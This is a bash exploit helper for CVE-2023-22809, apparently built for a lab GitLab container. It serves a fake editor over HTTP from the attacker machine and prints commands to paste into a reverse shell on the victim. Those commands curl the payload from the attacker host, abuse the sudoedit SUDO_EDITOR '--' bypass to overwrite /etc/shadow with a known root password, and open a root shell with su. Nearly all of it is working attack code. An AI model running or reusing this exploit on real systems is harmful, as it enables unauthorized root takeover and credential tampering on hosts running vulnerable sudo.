#!/bin/bash
# CVE-2023-22809 privilege escalation — transfer + run helper
#
# Run this ON THE ATTACKER. It starts a short-lived HTTP server that hosts
# the fake editor, then emits a shell block you paste into an existing git
# reverse shell on the victim. The block downloads the editor, triggers
# sudoedit with the SUDO_EDITOR `--` bypass, overwrites /etc/shadow, and
# gives you a root shell via `su`.
#
# Requires the lab-misconfigured sudoers rule baked into the GitLab image:
#   git ALL=(root) NOPASSWD: sudoedit /etc/gitlab/trusted.conf
# CVE-2023-22809 lets an attacker with that narrow rule edit ARBITRARY
# files by smuggling them into SUDO_EDITOR after a `--` separator.

set -e

EXPLOIT_DIR="/opt/exploits/sudoedit-bypass"
LHOST="${1:-172.26.0.10}"
HTTP_PORT="${2:-8890}"
REMOTE_EDITOR="/tmp/fake_editor.sh"

if [ ! -f "$EXPLOIT_DIR/fake_editor.sh" ]; then
    echo "[!] Missing $EXPLOIT_DIR/fake_editor.sh"
    exit 1
fi

pkill -f "http.server $HTTP_PORT" 2>/dev/null || true
(cd "$EXPLOIT_DIR" && python3 -m http.server "$HTTP_PORT" >/dev/null 2>&1) &
HTTP_PID=$!
sleep 1

cat <<EOF

════════════════════════════════════════════════════════════════════
 CVE-2023-22809 sudoedit bypass — Paste into the git reverse shell
════════════════════════════════════════════════════════════════════

rm -f ${REMOTE_EDITOR}
curl -s -o ${REMOTE_EDITOR} http://${LHOST}:${HTTP_PORT}/fake_editor.sh
chmod +x ${REMOTE_EDITOR}
cd /
SUDO_EDITOR="${REMOTE_EDITOR} -- /etc/shadow" sudoedit /etc/gitlab/trusted.conf
echo 'pwned123' | su -c '/bin/bash' root

════════════════════════════════════════════════════════════════════

If the exploit succeeds, the last \`su\` line opens a root bash shell
inside the victim container (uid=0). The root password "pwned123"
matches the hash our fake editor wrote into /etc/shadow.

Notes on the two extra lines:
  rm -f ${REMOTE_EDITOR}   → clear any leftover from a prior run (wrong
                             owner blocks chmod).
  cd /                     → sudoedit refuses to edit when cwd is
                             writable by the caller; / is safe.

Press Ctrl+C here to stop the HTTP server when done (PID ${HTTP_PID}).
EOF

trap "kill $HTTP_PID 2>/dev/null; echo '[*] HTTP server stopped'" EXIT
wait
